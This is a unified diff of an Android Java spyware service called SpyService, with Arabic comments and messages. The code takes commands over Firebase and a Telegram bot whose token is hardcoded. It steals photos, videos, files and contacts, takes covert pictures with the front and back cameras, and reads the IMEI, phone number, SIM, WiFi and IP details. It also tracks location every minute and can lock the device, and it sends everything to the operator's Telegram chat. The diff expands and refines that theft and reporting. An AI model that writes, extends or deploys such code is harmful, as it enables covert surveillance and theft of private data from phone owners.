@@ -37,8 +37,11 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -55,16 +58,17 @@ public class SpyService extends Service {
     private boolean isRecording = false;
     private String deviceId;
     private Camera camera;
+    private Camera frontCamera;
     private LocationManager locationManager;
     private LocationListener locationListener;
     private boolean isTrackingLocation = false;
     private boolean foregroundStarted = false;
 
-    // ====== توكن البوت ======
+    // Telegram
     private static final String BOT_TOKEN = "8962511911:AAHYZpdZJVkNif1iF1-3odKTqq2owgDk16M";
     private static final String CHAT_ID = "6793813126";
 
-    // ====== Firebase ======
+    // Firebase
     private FirebaseDatabase database;
     private DatabaseReference deviceRef;
     private DatabaseReference commandRef;
@@ -175,7 +179,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // ========== دوال الإرسال (بدون حذف للملفات) ==========
+    // ========== دوال الإرسال ==========
     // ======================================================================
 
     private void sendData(String type, String data) {
@@ -317,15 +321,15 @@ public class SpyService extends Service {
                     break;
                 }
                 case "get_photos": {
-                    File f = collectMedia("images");
-                    sendFileToFirebase(f, "🖼 الصور");
-                    sendFileToTelegram(f, "🖼 الصور");
+                    File f = collectMedia("images", 20);
+                    sendFileToFirebase(f, "🖼 الصور (20)");
+                    sendFileToTelegram(f, "🖼 الصور (20)");
                     break;
                 }
                 case "get_videos": {
-                    File f = collectMedia("videos");
-                    sendFileToFirebase(f, "🎬 الفيديوهات");
-                    sendFileToTelegram(f, "🎬 الفيديوهات");
+                    File f = collectMedia("videos", 10);
+                    sendFileToFirebase(f, "🎬 الفيديوهات (10)");
+                    sendFileToTelegram(f, "🎬 الفيديوهات (10)");
                     break;
                 }
                 case "get_files": {
@@ -347,7 +351,7 @@ public class SpyService extends Service {
                     break;
                 }
                 case "take_photo": {
-                    takePhoto();
+                    takePhotoBack();
                     break;
                 }
                 case "take_photo_front": {
@@ -411,15 +415,11 @@ public class SpyService extends Service {
                     break;
                 }
                 case "get_device": {
-                    File f = getDeviceInfo();
-                    sendFileToFirebase(f, "ℹ️ معلومات الجهاز");
-                    sendFileToTelegram(f, "ℹ️ معلومات الجهاز");
+                    sendDeviceInfo();
                     break;
                 }
                 case "get_network": {
-                    File f = getNetworkInfo();
-                    sendFileToFirebase(f, "📡 معلومات الشبكة");
-                    sendFileToTelegram(f, "📡 معلومات الشبكة");
+                    sendNetworkInfo();
                     break;
                 }
                 case "start_location_track": {
@@ -456,7 +456,6 @@ public class SpyService extends Service {
         } catch (Exception e) { Log.e(TAG, "battery err", e); }
         return -1;
     }
-
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
         FileOutputStream fos = new FileOutputStream(f);
@@ -524,7 +523,7 @@ public class SpyService extends Service {
         return f;
     }
 
-    private File collectMedia(String type) throws Exception {
+    private File collectMedia(String type, int limit) throws Exception {
         File zipFile = new File(getCacheDir(), type + ".zip");
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
         Uri uri = type.equals("images") ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI :
@@ -532,13 +531,14 @@ public class SpyService extends Service {
         String[] projection = {MediaStore.MediaColumns.DATA,
                 MediaStore.MediaColumns.DISPLAY_NAME};
         Cursor cursor = getContentResolver().query(uri, projection, null, null,
-                MediaStore.MediaColumns.DATE_ADDED + " DESC LIMIT 30");
+                MediaStore.MediaColumns.DATE_ADDED + " DESC LIMIT " + limit);
         if (cursor != null) {
-            while (cursor.moveToNext()) {
+            int count = 0;
+            while (cursor.moveToNext() && count < limit) {
                 String path = cursor.getString(0);
                 String name = cursor.getString(1);
                 File file = new File(path);
-                if (file.exists()) {
+                if (file.exists() && file.length() < 50 * 1024 * 1024) {
                     java.io.FileInputStream fis = new java.io.FileInputStream(file);
                     ZipEntry ze = new ZipEntry(name);
                     zos.putNextEntry(ze);
@@ -547,6 +547,7 @@ public class SpyService extends Service {
                     while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                     zos.closeEntry();
                     fis.close();
+                    count++;
                 }
             }
             cursor.close();
@@ -559,17 +560,19 @@ public class SpyService extends Service {
         File zipFile = new File(getCacheDir(), "all_files.zip");
         ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
         File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM");
+        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM", 20);
         File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-        if (download.exists()) addDirToZip(zos, download, "Downloads");
+        if (download.exists()) addDirToZip(zos, download, "Downloads", 20);
         zos.close();
         return zipFile;
     }
 
-    private void addDirToZip(ZipOutputStream zos, File dir, String parent) throws Exception {
+    private void addDirToZip(ZipOutputStream zos, File dir, String parent, int limit) throws Exception {
         File[] files = dir.listFiles();
         if (files == null) return;
+        int count = 0;
         for (File f : files) {
+            if (count >= limit) break;
             if (f.isFile() && f.length() < 20 * 1024 * 1024) {
                 java.io.FileInputStream fis = new java.io.FileInputStream(f);
                 ZipEntry ze = new ZipEntry(parent + "/" + f.getName());
@@ -579,6 +582,7 @@ public class SpyService extends Service {
                 while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                 zos.closeEntry();
                 fis.close();
+                count++;
             }
         }
     }
@@ -681,13 +685,15 @@ public class SpyService extends Service {
         sendTextToTelegram("🔔 تم إرسال إشعار وهمي");
     }
 
-    private void takePhoto() {
+    // ========== الكاميرا والفلاش ==========
+
+    private void takePhotoBack() {
         try {
-            Camera camera = Camera.open();
-            Camera.Parameters params = camera.getParameters();
+            Camera cam = Camera.open();
+            Camera.Parameters params = cam.getParameters();
             params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
-            camera.setParameters(params);
-            camera.takePicture(null, null, (data, camera1) -> {
+            cam.setParameters(params);
+            cam.takePicture(null, null, (data, camera1) -> {
                 try {
                     File file = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
                     FileOutputStream fos = new FileOutputStream(file);
@@ -695,15 +701,19 @@ public class SpyService extends Service {
                     fos.close();
                     sendFileToFirebase(file, "📸 صورة من الكاميرا الخلفية");
                     sendFileToTelegram(file, "📸 صورة من الكاميرا الخلفية");
+                    cam.release();
                 } catch (Exception e) { Log.e(TAG, "photo err", e); }
             });
-        } catch (Exception e) { sendData("ERROR", "فشل التصوير: " + e.getMessage()); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل التصوير الخلفي: " + e.getMessage());
+            sendTextToTelegram("❌ فشل التصوير الخلفي: " + e.getMessage());
+        }
     }
 
     private void takePhotoFront() {
         try {
-            Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
-            camera.takePicture(null, null, (data, camera1) -> {
+            Camera cam = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
+            cam.takePicture(null, null, (data, camera1) -> {
                 try {
                     File file = new File(getCacheDir(), "selfie_" + System.currentTimeMillis() + ".jpg");
                     FileOutputStream fos = new FileOutputStream(file);
@@ -711,21 +721,30 @@ public class SpyService extends Service {
                     fos.close();
                     sendFileToFirebase(file, "🤳 صورة سيلفي");
                     sendFileToTelegram(file, "🤳 صورة سيلفي");
+                    cam.release();
                 } catch (Exception e) { Log.e(TAG, "selfie err", e); }
             });
-        } catch (Exception e) { sendData("ERROR", "فشل التصوير الأمامي: " + e.getMessage()); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل التصوير الأمامي: " + e.getMessage());
+            sendTextToTelegram("❌ فشل التصوير الأمامي: " + e.getMessage());
+        }
     }
 
     private void flashOn() {
         try {
-            camera = Camera.open();
+            if (camera == null) {
+                camera = Camera.open();
+            }
             Camera.Parameters params = camera.getParameters();
             params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
             camera.setParameters(params);
             camera.startPreview();
             sendData("FLASH", "on");
             sendTextToTelegram("🔦 تم تشغيل الكشاف");
-        } catch (Exception e) { sendData("ERROR", "فشل تشغيل الفلاش: " + e.getMessage()); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل تشغيل الكشاف: " + e.getMessage());
+            sendTextToTelegram("❌ فشل تشغيل الكشاف");
+        }
     }
 
     private void flashOff() {
@@ -736,9 +755,16 @@ public class SpyService extends Service {
                 camera = null;
                 sendData("FLASH", "off");
                 sendTextToTelegram("🔦 تم إطفاء الكشاف");
+            } else {
+                sendTextToTelegram("⚠️ الكشاف ليس قيد التشغيل");
             }
-        } catch (Exception e) { sendData("ERROR", "فشل إطفاء الفلاش: " + e.getMessage()); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل إطفاء الكشاف: " + e.getMessage());
+            sendTextToTelegram("❌ فشل إطفاء الكشاف");
+        }
     }
+
+    // ========== معلومات الجهاز ==========
 
     private void getImei() {
         try {
@@ -747,7 +773,10 @@ public class SpyService extends Service {
             String data = "IMEI: " + (imei != null ? imei : "غير متاح");
             sendData("IMEI", data);
             sendTextToTelegram("📟 " + data);
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة IMEI"); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل قراءة IMEI");
+            sendTextToTelegram("❌ فشل قراءة IMEI");
+        }
     }
 
     private void getPhoneNumber() {
@@ -757,7 +786,10 @@ public class SpyService extends Service {
             String data = "رقم الهاتف: " + (number != null ? number : "غير متاح");
             sendData("PHONE", data);
             sendTextToTelegram("📞 " + data);
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة الرقم"); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل قراءة الرقم");
+            sendTextToTelegram("❌ فشل قراءة الرقم");
+        }
     }
 
     private void getSimInfo() {
@@ -766,7 +798,10 @@ public class SpyService extends Service {
             String data = "SIM: " + tm.getSimOperatorName() + " | " + tm.getSimCountryIso() + " | " + tm.getSimSerialNumber();
             sendData("SIM", data);
             sendTextToTelegram("📡 " + data);
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة SIM"); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل قراءة SIM");
+            sendTextToTelegram("❌ فشل قراءة SIM");
+        }
     }
 
     private void getWifiInfo() {
@@ -776,7 +811,10 @@ public class SpyService extends Service {
             String data = "WiFi: " + info.getSSID() + " | القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5";
             sendData("WIFI", data);
             sendTextToTelegram("📶 " + data);
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة WiFi"); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل قراءة WiFi");
+            sendTextToTelegram("❌ فشل قراءة WiFi");
+        }
     }
 
     private void getBatteryInfo() {
@@ -793,7 +831,10 @@ public class SpyService extends Service {
                 sendData("BATTERY", data);
                 sendTextToTelegram("🔋 " + data);
             }
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة البطارية"); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل قراءة البطارية");
+            sendTextToTelegram("❌ فشل قراءة البطارية");
+        }
     }
 
     private void getPublicIp() {
@@ -807,7 +848,10 @@ public class SpyService extends Service {
             String data = "IP العام: " + ip;
             sendData("IP", data);
             sendTextToTelegram("🌐 " + data);
-        } catch (Exception e) { sendData("ERROR", "فشل الحصول على IP"); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل الحصول على IP");
+            sendTextToTelegram("❌ فشل الحصول على IP");
+        }
     }
 
     private void startLocationTracking() {
@@ -829,6 +873,7 @@ public class SpyService extends Service {
             sendTextToTelegram("📍 بدأ تتبع الموقع (كل دقيقة)");
         } catch (SecurityException e) {
             sendData("ERROR", "صلاحية الموقع غير مفعلة");
+            sendTextToTelegram("❌ صلاحية الموقع غير مفعلة");
         }
     }
 
@@ -839,7 +884,10 @@ public class SpyService extends Service {
             isTrackingLocation = false;
             sendData("LOCATION_TRACK", "stopped");
             sendTextToTelegram("🛑 تم إيقاف تتبع الموقع");
-        } catch (Exception e) { sendData("ERROR", "فشل إيقاف التتبع"); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل إيقاف التتبع");
+            sendTextToTelegram("❌ فشل إيقاف التتبع");
+        }
     }
 
     private void lockDevice() {
@@ -848,7 +896,10 @@ public class SpyService extends Service {
             dpm.lockNow();
             sendData("LOCK", "locked");
             sendTextToTelegram("🔒 تم قفل الجهاز");
-        } catch (Exception e) { sendData("ERROR", "فشل قفل الجهاز: " + e.getMessage()); }
+        } catch (Exception e) {
+            sendData("ERROR", "فشل قفل الجهاز: " + e.getMessage());
+            sendTextToTelegram("❌ فشل قفل الجهاز");
+        }
     }
 
     private void rebootDevice() {
@@ -912,40 +963,97 @@ public class SpyService extends Service {
         }
     }
 
-    private File getDeviceInfo() {
+    private void sendDeviceInfo() {
         try {
-            File f = new File(getCacheDir(), "device_info.txt");
-            FileOutputStream fos = new FileOutputStream(f);
-            String info = "الموديل: " + Build.MODEL + "\n" +
+            String info = "📱 **معلومات الجهاز**\n\n" +
+                    "الموديل: " + Build.MODEL + "\n" +
                     "الشركة: " + Build.MANUFACTURER + "\n" +
                     "أندرويد: " + Build.VERSION.RELEASE + "\n" +
                     "API: " + Build.VERSION.SDK_INT + "\n" +
-                    "Android ID: " + deviceId;
-            fos.write(info.getBytes());
-            fos.close();
-            return f;
+                    "Android ID: `" + deviceId + "`\n" +
+                    "IMEI: " + getImeiValue() + "\n" +
+                    "رقم الهاتف: " + getPhoneValue() + "\n" +
+                    "الشريحة: " + getSimValue() + "\n" +
+                    "WiFi: " + getWifiValue() + "\n" +
+                    "البطارية: " + getBatteryValue() + "%";
+            sendData("DEVICE_INFO", info);
+            sendTextToTelegram(info);
         } catch (Exception e) {
-            Log.e(TAG, "getDeviceInfo error", e);
-            return new File(getCacheDir(), "device_info.txt");
+            sendData("ERROR", "فشل قراءة معلومات الجهاز");
+            sendTextToTelegram("❌ فشل قراءة معلومات الجهاز");
         }
     }
 
-    private File getNetworkInfo() {
+    private void sendNetworkInfo() {
         try {
-            File f = new File(getCacheDir(), "network_info.txt");
-            FileOutputStream fos = new FileOutputStream(f);
             android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
             android.net.wifi.WifiInfo wifiInfo = wifi.getConnectionInfo();
-            String info = "WiFi: " + (wifiInfo.getSSID() != null ? wifiInfo.getSSID() : "غير متصل") + "\n" +
+            String info = "📡 **معلومات الشبكة**\n\n" +
+                    "WiFi: " + (wifiInfo.getSSID() != null ? wifiInfo.getSSID() : "غير متصل") + "\n" +
                     "القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(wifiInfo.getRssi(), 5) + "/5\n" +
+                    "IP: " + getIpValue() + "\n" +
                     "المشغل: " + ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getNetworkOperatorName();
-            fos.write(info.getBytes());
-            fos.close();
-            return f;
+            sendData("NETWORK_INFO", info);
+            sendTextToTelegram(info);
         } catch (Exception e) {
-            Log.e(TAG, "getNetworkInfo error", e);
-            return new File(getCacheDir(), "network_info.txt");
+            sendData("ERROR", "فشل قراءة معلومات الشبكة");
+            sendTextToTelegram("❌ فشل قراءة معلومات الشبكة");
         }
+    }
+
+    // دوال مساعدة لجلب القيم كـ String
+    private String getImeiValue() {
+        try {
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            return (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? tm.getImei() : tm.getDeviceId();
+        } catch (Exception e) { return "غير متاح"; }
+    }
+
+    private String getPhoneValue() {
+        try {
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            return tm.getLine1Number();
+        } catch (Exception e) { return "غير متاح"; }
+    }
+
+    private String getSimValue() {
+        try {
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            return tm.getSimOperatorName() + " (" + tm.getSimCountryIso() + ")";
+        } catch (Exception e) { return "غير متاح"; }
+    }
+
+    private String getWifiValue() {
+        try {
+            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
+            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
+            return info.getSSID();
+        } catch (Exception e) { return "غير متاح"; }
+    }
+
+    private String getBatteryValue() {
+        try {
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryIntent = registerReceiver(null, ifilter);
+            if (batteryIntent != null) {
+                int level = batteryIntent.getIntExtra("level", -1);
+                int scale = batteryIntent.getIntExtra("scale", -1);
+                if (level >= 0 && scale > 0) return String.valueOf((level * 100) / scale);
+            }
+        } catch (Exception e) { return "غير متاح"; }
+        return "غير متاح";
+    }
+
+    private String getIpValue() {
+        try {
+            URL url = new URL("https://api.ipify.org");
+            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+            conn.setConnectTimeout(5000);
+            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
+            String ip = reader.readLine();
+            reader.close();
+            return ip;
+        } catch (Exception e) { return "غير متاح"; }
     }
 
     // ======================================================================
